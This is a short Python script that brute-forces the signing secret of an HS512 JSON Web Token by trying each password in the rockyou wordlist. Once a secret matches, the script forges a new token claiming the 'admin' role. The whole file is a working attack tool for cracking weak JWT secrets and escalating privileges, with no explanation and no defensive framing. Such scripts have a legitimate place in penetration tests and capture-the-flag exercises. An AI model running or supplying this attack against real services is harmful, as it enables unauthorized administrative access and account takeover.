import jwt

encoded_jwt = "<jwt token>"


# Get this on the internet and process it, mine is already been cleaned
with open("rockyou_clean.txt", "r") as f:
    content = f.read().split()

SECRET_KEY = None

for secret in content:
    print(f"Try {secret}: ", end="")
    try:
        print("Success\n", jwt.decode(encoded_jwt, secret, algorithms="HS512"))
        SECRET_KEY = secret
        break
    except jwt.exceptions.InvalidSignatureError:
        print("Fail")

if SECRET_KEY:
    print(jwt.encode({"role": "admin"}, SECRET_KEY, algorithm="HS512"))
else:
    print("Can not brute the secret")
